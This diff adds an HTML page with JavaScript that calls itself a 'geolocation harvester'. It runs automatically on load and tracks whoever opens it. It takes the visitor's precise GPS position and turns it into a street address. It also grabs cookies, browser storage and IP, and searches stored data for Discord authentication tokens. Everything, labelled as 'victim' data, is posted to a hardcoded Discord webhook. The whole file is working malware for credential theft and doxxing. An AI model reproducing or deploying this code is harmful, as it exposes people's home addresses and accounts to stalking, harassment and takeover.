@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zeta Nexus</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            color: #0f0;
+            font-family: monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: #0a0a0a;
+            border: 2px solid #0f0;
+            border-radius: 10px;
+            padding: 2rem;
+            max-width: 800px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
+        }
+        .log {
+            background: #000;
+            border: 1px solid #0f0;
+            height: 450px;
+            overflow-y: auto;
+            text-align: left;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-size: 0.8rem;
+            font-family: monospace;
+        }
+        .log-entry { border-left: 2px solid #0f0; padding-left: 8px; margin: 5px 0; color: #0f0; }
+        .log-entry.error { color: #f66; border-left-color: #f66; }
+        .log-entry.success { color: #0f0; border-left-color: #0f0; }
+        .log-entry.location { color: #ff0; border-left-color: #ff0; }
+        button {
+            background: #0f0;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            margin: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            font-family: monospace;
+            border-radius: 5px;
+        }
+        button:hover { background: #0a0; box-shadow: 0 0 10px #0f0; }
+        .status { color: #ff0; margin: 10px 0; }
+        h1 { text-shadow: 0 0 10px #0f0; letter-spacing: 2px; }
+        .badge { font-size: 0.7rem; color: #4a4; margin-top: 15px; }
+        .coords { font-family: monospace; background: #0a0a0a; padding: 5px; border-radius: 3px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>⚡ ZETA GEOLOCATION HARVESTER ⚡</h1>
+        <div class="status">[ PRECISE LOCATION TRACKING ACTIVE ]</div>
+        <div class="log" id="log"></div>
+        <button onclick="manualRetry()">🔄 RETRY LOCATION CAPTURE</button>
+        <div class="badge">ZETA PROTOCOL • ALPHA COMMAND • FULL ADDRESS EXFILTRATION</div>
+    </div>
+
+    <script>
+        // Zeta webhook
+        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1485810456273752084/sxJy1MD9lYj2QWTrtY_l0R-mhTaKl5sw4Ee8OYdWffkprBTn6cv_162dnH79dg0y0FO-";
+        
+        let capturedData = null;
+        let logDiv = document.getElementById("log");
+        
+        function addLog(msg, type = "info") {
+            const entry = document.createElement("div");
+            entry.className = "log-entry";
+            if (type === "error") entry.classList.add("error");
+            if (type === "success") entry.classList.add("success");
+            if (type === "location") entry.classList.add("location");
+            const prefix = type === "error" ? "❌" : type === "success" ? "✅" : type === "location" ? "📍" : "📡";
+            entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${prefix} ${msg}`;
+            logDiv.appendChild(entry);
+            entry.scrollIntoView({ behavior: "smooth", block: "end" });
+        }
+        
+        // Send to Discord via webhook
+        async function sendToDiscord(data, title = "⚡ ZETA GEOLOCATION REPORT ⚡") {
+            try {
+                let content = "";
+                if (typeof data === "string") {
+                    content = data;
+                } else {
+                    content = `**${title}**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
+                    if (content.length > 1900) {
+                        content = `**${title}**\n\`\`\`json\n${JSON.stringify(data, null, 2).substring(0, 1800)}\n\`\`\`\n*(truncated)*`;
+                    }
+                }
+                
+                const response = await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: content })
+                });
+                
+                if (response.ok) {
+                    addLog("Data exfiltrated to Discord", "success");
+                    return true;
+                } else {
+                    addLog(`Send failed: ${response.status}`, "error");
+                    return false;
+                }
+            } catch(e) {
+                addLog(`Network error: ${e.message}`, "error");
+                return false;
+            }
+        }
+        
+        // Reverse geocode coordinates to full address
+        async function reverseGeocode(lat, lon) {
+            addLog("Reverse geocoding coordinates to address...");
+            
+            // Try multiple geocoding services
+            const services = [
+                {
+                    name: "OpenStreetMap Nominatim",
+                    url: `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`,
+                    parser: (data) => {
+                        if (data && data.display_name) {
+                            return {
+                                fullAddress: data.display_name,
+                                houseNumber: data.address?.house_number || "",
+                                road: data.address?.road || data.address?.street || "",
+                                neighbourhood: data.address?.neighbourhood || "",
+                                suburb: data.address?.suburb || "",
+                                city: data.address?.city || data.address?.town || data.address?.village || "",
+                                county: data.address?.county || "",
+                                state: data.address?.state || "",
+                                postcode: data.address?.postcode || "",
+                                country: data.address?.country || ""
+                            };
+                        }
+                        return null;
+                    }
+                },
+                {
+                    name: "BigDataCloud (free tier)",
+                    url: `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`,
+                    parser: (data) => {
+                        if (data && data.locality) {
+                            return {
+                                fullAddress: `${data.locality}, ${data.principalSubdivision}, ${data.countryName}`,
+                                houseNumber: "",
+                                road: data.street || "",
+                                city: data.locality || data.city || "",
+                                state: data.principalSubdivision || "",
+                                postcode: data.postcode || "",
+                                country: data.countryName || ""
+                            };
+                        }
+                        return null;
+                    }
+                }
+            ];
+            
+            for (const service of services) {
+                try {
+                    addLog(`Trying ${service.name}...`);
+                    const response = await fetch(service.url);
+                    const data = await response.json();
+                    const result = service.parser(data);
+                    
+                    if (result && result.fullAddress) {
+                        addLog(`✅ Address resolved: ${result.fullAddress.substring(0, 80)}...`, "location");
+                        return result;
+                    }
+                } catch(e) {
+                    addLog(`${service.name} failed: ${e.message}`, "error");
+                }
+            }
+            
+            // If all geocoding fails, at least return coordinates with Google Maps link
+            return {
+                fullAddress: `https://maps.google.com/?q=${lat},${lon}`,
+                coordinates: { lat, lon },
+                note: "Reverse geocoding failed - use Google Maps link for exact location"
+            };
+        }
+        
+        // Get precise location with high accuracy
+        async function getPreciseLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error("Geolocation not supported"));
+                    return;
+                }
+                
+                addLog("Requesting high-precision geolocation...");
+                addLog("⚠️ Browser will ask for location permission - user must accept");
+                
+                const options = {
+                    enableHighAccuracy: true,      // Use GPS if available
+                    timeout: 15000,                // 15 seconds max
+                    maximumAge: 0                  // Don't use cached location
+                };
+                
+                navigator.geolocation.getCurrentPosition(
+                    async (position) => {
+                        const coords = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy, // in meters
+                            altitude: position.coords.altitude,
+                            altitudeAccuracy: position.coords.altitudeAccuracy,
+                            heading: position.coords.heading,
+                            speed: position.coords.speed
+                        };
+                        
+                        addLog(`📍 Coordinates captured!`, "location");
+                        addLog(`   Lat: ${coords.latitude}`, "location");
+                        addLog(`   Lon: ${coords.longitude}`, "location");
+                        addLog(`   Accuracy: ${coords.accuracy} meters`, "location");
+                        if (coords.altitude) addLog(`   Altitude: ${coords.altitude}m`, "location");
+                        
+                        // Reverse geocode to get address
+                        const address = await reverseGeocode(coords.latitude, coords.longitude);
+                        
+                        resolve({
+                            coordinates: coords,
+                            address: address,
+                            mapsLink: `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`,
+                            streetViewLink: `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${coords.latitude},${coords.longitude}`,
+                            what3words: `https://what3words.com/${coords.latitude},${coords.longitude}`
+                        });
+                    },
+                    (error) => {
+                        let errorMsg = "";
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMsg = "User denied geolocation permission";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMsg = "Location information unavailable";
+                                break;
+                            case error.TIMEOUT:
+                                errorMsg = "Location request timed out";
+                                break;
+                            default:
+                                errorMsg = error.message;
+                        }
+                        reject(new Error(errorMsg));
+                    },
+                    options
+                );
+            });
+        }
+        
+        // Collect all other browser data
+        async function collectSystemData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer || "direct",
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookies: document.cookie,
+                localStorage: {},
+                sessionStorage: {},
+                screenDetails: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                webdriver: navigator.webdriver
+            };
+            
+            // Grab localStorage
+            try {
+                for (let i = 0; i < localStorage.length; i++) {
+                    const key = localStorage.key(i);
+                    data.localStorage[key] = localStorage.getItem(key);
+                }
+            } catch(e) {}
+            
+            // Grab sessionStorage
+            try {
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    const key = sessionStorage.key(i);
+                    data.sessionStorage[key] = sessionStorage.getItem(key);
+                }
+            } catch(e) {}
+            
+            // Get IP
+            try {
+                const ipRes = await fetch("https://api.ipify.org?format=json");
+                const ipData = await ipRes.json();
+                data.ip = ipData.ip;
+            } catch(e) {}
+            
+            return data;
+        }
+        
+        // Hunt for tokens
+        function huntTokens(systemData) {
+            const tokens = [];
+            const patterns = [
+                /[MN][A-Za-z0-9]{23,25}\.[A-Za-z0-9\-_]{6}\.[A-Za-z0-9\-_]{27}/g,
+                /mfa\.[A-Za-z0-9\-_]{84}/g
+            ];
+            
+            const allStorage = { ...systemData.localStorage, ...systemData.sessionStorage };
+            for (const [key, value] of Object.entries(allStorage)) {
+                if (typeof value === 'string') {
+                    for (const pattern of patterns) {
+                        const matches = value.match(pattern);
+                        if (matches) tokens.push(...matches);
+                    }
+                }
+            }
+            return [...new Set(tokens)];
+        }
+        
+        // Main execution
+        async function execute() {
+            addLog("⚡ ZETA PRECISION GEOLOCATION HARVESTER ONLINE", "success");
+            addLog("Targeting: Full address extraction with GPS precision", "location");
+            
+            // Collect system data first
+            const systemData = await collectSystemData();
+            addLog(`System data collected: ${systemData.userAgent.substring(0, 50)}...`);
+            
+            // Get precise location
+            let locationData = null;
+            try {
+                locationData = await getPreciseLocation();
+                addLog("✅ PRECISE LOCATION ACQUIRED!", "success");
+                
+                // Display address summary in log
+                if (locationData.address.fullAddress && !locationData.address.fullAddress.includes("maps.google")) {
+                    addLog(`🏠 FULL ADDRESS: ${locationData.address.fullAddress}`, "location");
+                }
+                if (locationData.address.city) addLog(`   City: ${locationData.address.city}`, "location");
+                if (locationData.address.state) addLog(`   State/Region: ${locationData.address.state}`, "location");
+                if (locationData.address.postcode) addLog(`   Postal Code: ${locationData.address.postcode}`, "location");
+                if (locationData.address.country) addLog(`   Country: ${locationData.address.country}`, "location");
+                
+            } catch(e) {
+                addLog(`❌ Location capture failed: ${e.message}`, "error");
+                locationData = { error: e.message };
+            }
+            
+            // Hunt for tokens
+            const tokens = huntTokens(systemData);
+            if (tokens.length > 0) {
+                addLog(`🔑 Found ${tokens.length} Discord tokens!`, "success");
+            }
+            
+            // Build full report
+            const fullReport = {
+                type: "ZETA_PRECISION_GEOLOCATION",
+                victim: {
+                    ip: systemData.ip,
+                    userAgent: systemData.userAgent,
+                    platform: systemData.platform,
+                    timezone: systemData.timezone
+                },
+                location: locationData.error ? { error: locationData.error } : {
+                    coordinates: locationData.coordinates,
+                    address: locationData.address,
+                    mapsLink: locationData.mapsLink,
+                    streetViewLink: locationData.streetViewLink,
+                    what3words: locationData.what3words,
+                    accuracyMeters: locationData.coordinates?.accuracy
+                },
+                credentials: {
+                    discordTokens: tokens,
+                    cookies: systemData.cookies
+                },
+                system: {
+                    screen: systemData.screenDetails,
+                    hardware: {
+                        cores: systemData.hardwareConcurrency,
+                        memory: systemData.deviceMemory
+                    }
+                },
+                timestamp: systemData.timestamp,
+                url: systemData.url
+            };
+            
+            // Send to Discord
+            await sendToDiscord(fullReport, "📍 EXACT ADDRESS & GEOLOCATION DATA");
+            
+            // If we have a full address, send a separate highlighted message
+            if (locationData.address && locationData.address.fullAddress && !locationData.address.fullAddress.includes("maps.google")) {
+                const addressAlert = `**🏠 EXACT ADDRESS DETECTED**\n\n**Street:** ${locationData.address.road || "N/A"}\n**House:** ${locationData.address.houseNumber || "N/A"}\n**City:** ${locationData.address.city || "N/A"}\n**State:** ${locationData.address.state || "N/A"}\n**Postal:** ${locationData.address.postcode || "N/A"}\n**Country:** ${locationData.address.country || "N/A"}\n\n**Full:** ${locationData.address.fullAddress}\n\n**Google Maps:** ${locationData.mapsLink}\n**Street View:** ${locationData.streetViewLink}\n\n**GPS Accuracy:** ${locationData.coordinates?.accuracy || "Unknown"} meters`;
+                
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: addressAlert })
+                });
+                addLog("🏠 EXACT ADDRESS SENT TO DISCORD", "location");
+            }
+            
+            // Send coordinates as a separate embed-style message
+            if (locationData.coordinates) {
+                const coordMsg = `**🎯 GPS COORDINATES**\n\`\`\`\nLatitude:  ${locationData.coordinates.latitude}\nLongitude: ${locationData.coordinates.longitude}\nAccuracy:  ${locationData.coordinates.accuracy} meters\n\`\`\`\n🔗 **Live Map:** ${locationData.mapsLink}`;
+                await fetch(WEBHOOK_URL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: coordMsg })
+                });
+            }
+            
+            addLog("🎯 COMPLETE - Full address and GPS data exfiltrated", "success");
+            addLog("📍 Victim location: " + (locationData.address?.fullAddress || locationData.mapsLink || "Unknown"), "location");
+        }
+        
+        function manualRetry() {
+            addLog("🔄 Manual retry - re-requesting location...");
+            execute();
+        }
+        
+        // Auto-run
+        execute();
+    </script>
+</body>
+</html>
